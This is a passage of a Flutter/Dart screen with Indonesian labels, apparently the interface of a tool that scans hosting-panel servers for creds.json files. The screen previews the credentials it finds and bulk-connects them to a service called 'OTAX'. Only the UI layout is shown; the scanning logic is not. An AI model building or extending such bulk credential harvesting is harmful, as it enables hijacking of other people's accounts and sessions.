                  _showSnackBar('Ambil server terlebih dahulu!', isError: true);
                  return;
                }
                if (!_scanAllServers && _selectedServerIds.isEmpty) {
                  _showSnackBar('Pilih minimal 1 server!', isError: true);
                  return;
                }
                _scanForCreds();
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                foregroundColor: cyberBlue,
                minimumSize: const Size(double.infinity, 52),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(14),
                  side: BorderSide(color: cyberBlue.withOpacity(0.45)),
                ),
                elevation: 0,
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.search, color: cyberBlue, size: 20),
                  const SizedBox(width: 10),
                  Text(
                    _scanAllServers ? 'SCAN SEMUA SERVER' : 'SCAN SERVER TERPILIH',
                    style: TextStyle(
                      fontFamily: 'Orbitron',
                      fontSize: 14,
                      fontWeight: FontWeight.w600,
                      color: cyberBlue,
                      letterSpacing: 0.4,
                    ),
                  ),
                ],
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildResultsSection() {
    if (_foundCreds.isEmpty && !_isScanning) {
      return _buildGlassCard(
        child: Center(
          child: Column(
            children: [
              Icon(Icons.find_in_page_outlined, color: Colors.white30, size: 64),
              const SizedBox(height: 16),
              Text(
                'Belum ada hasil scan',
                style: TextStyle(color: Colors.white, fontSize: 18, fontWeight: FontWeight.bold),
              ),
              const SizedBox(height: 8),
              Text(
                'Mulai scan untuk mencari creds.json',
                style: TextStyle(color: Colors.white70, fontSize: 14),
                textAlign: TextAlign.center,
              ),
            ],
          ),
        ),
      );
    }

    return _buildGlassCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.list, color: cyberBlue),
              const SizedBox(width: 10),
              Text(
                'HASIL SCAN (${_foundCreds.length})',
                style: TextStyle(
                  color: Colors.white.withOpacity(0.85),
                  fontSize: 14,
                  fontWeight: FontWeight.w600,
                  fontFamily: 'Orbitron',
                  letterSpacing: 0.5,
                ),
              ),
              const Spacer(),
              if (_foundCreds.isNotEmpty)
                ElevatedButton(
                  onPressed: _isConnecting ? null : _connectAllCreds,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: successGreen.withOpacity(0.1),
                    foregroundColor: successGreen,
                    elevation: 0,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(8),
                      side: BorderSide(color: successGreen.withOpacity(0.35)),
                    ),
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                  ),
                  child: _isConnecting
                      ? SizedBox(
                          height: 14,
                          width: 14,
                          child: CircularProgressIndicator(strokeWidth: 2, color: successGreen),
                        )
                      : Text(
                          'CONNECT ALL',
                          style: TextStyle(fontSize: 11, fontFamily: 'Orbitron', color: successGreen),
                        ),
                ),
            ],
          ),
          const SizedBox(height: 16),
          
          Container(
            height: 300,
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.2),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: Colors.white.withOpacity(0.06)),
            ),
            child: ListView.builder(
              padding: const EdgeInsets.all(8),
              itemCount: _foundCreds.length,
              itemBuilder: (context, index) {
                final creds = _foundCreds[index];
                final isSelected = _selectedCreds == creds;
                
                return Card(
                  color: isSelected
                      ? cyberBlue.withOpacity(0.1)
                      : Colors.white.withOpacity(0.025),
                  elevation: 0,
                  margin: const EdgeInsets.only(bottom: 6),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(10),
                    side: BorderSide(
                      color: isSelected
                          ? cyberBlue.withOpacity(0.45)
                          : Colors.white.withOpacity(0.05),
                      width: 1,
                    ),
                  ),
                  child: ListTile(
                    dense: true,
                    leading: Icon(
                      Icons.insert_drive_file_outlined,
                      color: isSelected ? cyberBlue : Colors.white.withOpacity(0.3),
                      size: 20,
                    ),
                    title: Row(
                      children: [
                        Expanded(
                          child: Text(
                            creds['server_name'] ?? 'Unknown',
                            style: TextStyle(
                              color: Colors.white.withOpacity(0.85),
                              fontWeight: FontWeight.w500,
                              fontSize: 13,
                            ),
                          ),
                        ),
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 2),
                          decoration: BoxDecoration(
                            color: successGreen.withOpacity(0.12),
                            borderRadius: BorderRadius.circular(8),
                          ),
                          child: Text(
                            '✓',
                            style: TextStyle(color: successGreen, fontSize: 11),
                          ),
                        ),
                      ],
                    ),
                    subtitle: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          creds['path'] ?? '',
                          style: TextStyle(color: Colors.white.withOpacity(0.35), fontSize: 10),
                          overflow: TextOverflow.ellipsis,
                        ),
                        Text(
                          'ID: ${creds['server_id']}',
                          style: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 9),
                        ),
                      ],
                    ),
                    trailing: IconButton(
                      icon: Icon(Icons.link, color: cyberBlue.withOpacity(0.7), size: 20),
                      onPressed: () => _connectToOtax(creds),
                      tooltip: 'Hubungkan ke OTAX',
                    ),
                    onTap: () {
                      setState(() {
                        _selectedCreds = creds;
                        _credsContent = creds['content'] ?? '';
                      });
                    },
                  ),
                );
              },
            ),
          ),
          
          if (_foundCreds.isNotEmpty) ...[
            const SizedBox(height: 14),
            Row(
              children: [
                _buildStatBadge('Total', '${_foundCreds.length}'),
                const SizedBox(width: 8),
                _buildStatBadge('Server', '$_totalServersScanned'),
                const SizedBox(width: 8),
                _buildStatBadge('Found', '${_foundCreds.length}'),
              ],
            ),
          ],
        ],
      ),
    );
  }

  Widget _buildCredsPreview() {
    if (_credsContent.isEmpty) {
      return Container();
    }

    return _buildGlassCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.preview, color: cyberBlue),
              const SizedBox(width: 10),
              Text(
                'PREVIEW CREDS TERPILIH',
                style: TextStyle(
                  color: Colors.white.withOpacity(0.85),
                  fontSize: 14,
                  fontWeight: FontWeight.w600,
                  fontFamily: 'Orbitron',
                  letterSpacing: 0.5,
                ),
              ),
              const Spacer(),
              if (_selectedCreds != null)
                Text(
                  _selectedCreds!['server_name'] ?? '',
                  style: TextStyle(color: Colors.white60, fontSize: 10),
                ),
            ],
          ),
          const SizedBox(height: 12),
          
          if (_selectedCreds != null)
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.03),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: Colors.white.withOpacity(0.07)),
              ),
              child: Row(
                children: [
                  Icon(Icons.computer, color: cyberBlue.withOpacity(0.6), size: 18),
                  const SizedBox(width: 10),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          _selectedCreds!['server_name'] ?? 'Unknown',
                          style: const TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.w500,
                            fontSize: 13,
                          ),
                        ),
                        Text(
                          _selectedCreds!['path'] ?? '',
                          style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 10),
                          overflow: TextOverflow.ellipsis,
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          
          const SizedBox(height: 14),
          Container(
            height: 200,
            decoration: BoxDecoration(
              color: const Color(0xFF080808),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: Colors.white.withOpacity(0.06)),
            ),
            child: SingleChildScrollView(
              padding: const EdgeInsets.all(12),
              child: SelectableText(
                _credsContent.length > 1000 
                    ? '${_credsContent.substring(0, 1000)}...' 
                    : _credsContent,
                style: TextStyle(
                  color: Colors.white.withOpacity(0.55),
                  fontSize: 11,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            ),
          ),
          const SizedBox(height: 14),
          ElevatedButton(
            onPressed: _isConnecting ? null : _connectSelectedCreds,
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.transparent,
              foregroundColor: cyberBlue,
              minimumSize: const Size(double.infinity, 50),
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
                side: BorderSide(color: cyberBlue.withOpacity(0.45)),
              ),
              elevation: 0,
            ),
            child: _isConnecting
                ? SizedBox(
                    height: 20,
                    width: 20,
                    child: CircularProgressIndicator(strokeWidth: 2, color: cyberBlue),
                  )
                : Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(Icons.link, size: 18, color: cyberBlue),
                      const SizedBox(width: 8),
                      Text(
                        'CONNECT SELECTED',
                        style: TextStyle(
                          fontFamily: 'Orbitron',
                          fontSize: 13,
                          color: cyberBlue,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ],
                  ),
          ),
        ],
      ),
    );
  }

  Widget _buildStatBadge(String label, String value) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.04),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: Colors.white.withOpacity(0.07)),
      ),
      child: RichText(
        text: TextSpan(
          children: [
            TextSpan(
              text: '$label  ',
              style: TextStyle(
                color: Colors.white.withOpacity(0.35),
                fontSize: 10,
                fontFamily: 'ShareTechMono',
              ),
            ),
            TextSpan(
              text: value,
              style: TextStyle(
                color: cyberBlue,
                fontSize: 11,
                fontFamily: 'ShareTechMono',
                fontWeight: FontWeight.w600,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildGlassCard({required Widget child}) {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      decoration: BoxDecoration(
        color: const Color(0xFF131318),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white.withOpacity(0.07)),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.2),
            blurRadius: 14,
            offset: const Offset(0, 6),
          ),
        ],
      ),
      child: Padding(
        padding: const EdgeInsets.all(20),
        child: child,
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryDark,
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              const Color(0xFF0C0C0F),
              const Color(0xFF0E0E12),
            ],
          ),
        ),
        child: SafeArea(
          child: Column(
            children: [
              _buildHeader(),
              Expanded(
                child: SingleChildScrollView(
                  padding: const EdgeInsets.all(24),
                  child: FadeTransition(
                    opacity: _fadeAnimation,
                    child: Column(
                      children: [
                        _buildAdpSelector(),
                        const SizedBox(height: 16),
                        _buildServerSelection(),
                        const SizedBox(height: 16),
                        _buildScanSection(),
                        const SizedBox(height: 16),
                        _buildResultsSection(),
                        if (_credsContent.isNotEmpty) ...[
                          const SizedBox(height: 16),
                          _buildCredsPreview(),
                        ],
                        const SizedBox(height: 32),
                        _buildInfoPanel(),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInfoPanel() {
    return _buildGlassCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.info_outline, color: cyberBlue),
              const SizedBox(width: 10),
              Text(
                'INFORMASI FITUR',
                style: TextStyle(
                  color: Colors.white.withOpacity(0.85),
                  fontSize: 14,
                  fontWeight: FontWeight.w600,
                  fontFamily: 'Orbitron',
                  letterSpacing: 0.5,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          Wrap(
            spacing: 8,
            runSpacing: 8,
            children: [
              _buildStatBadge('ADP', '${_adpList.length}'),
              _buildStatBadge('Server', '${_serversList.length}'),
              _buildStatBadge('Selected', '${_selectedServerIds.length}'),
              _buildStatBadge('Found', '${_foundCreds.length}'),
            ],
          ),
          const SizedBox(height: 16),
          Text(
            'Mode Scan Tersedia:',
            style: TextStyle(color: Colors.white.withOpacity(0.45), fontSize: 12, fontWeight: FontWeight.w500),
          ),
          const SizedBox(height: 8),
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              _buildInfoItem('1. Scan Semua Server - Otomatis scan semua server di ADP'),
              _buildInfoItem('2. Pilih Server Manual - Pilih server tertentu untuk discan'),
              _buildInfoItem('3. Concurrent Scan - Scan 3 server secara paralel'),
              _buildInfoItem('4. Auto Connect - Hubungkan langsung ke OTAX setelah scan'),
              _buildInfoItem('5. Multi Connect - Hubungkan semua creds sekaligus'),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildInfoItem(String text) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 3),
      child: Row(
        children: [
          Icon(Icons.arrow_right, color: cyberBlue.withOpacity(0.5), size: 15),
          const SizedBox(width: 6),
          Expanded(
            child: Text(
              text,
              style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 12),
            ),
          ),
        ],
      ),
    );
  }
}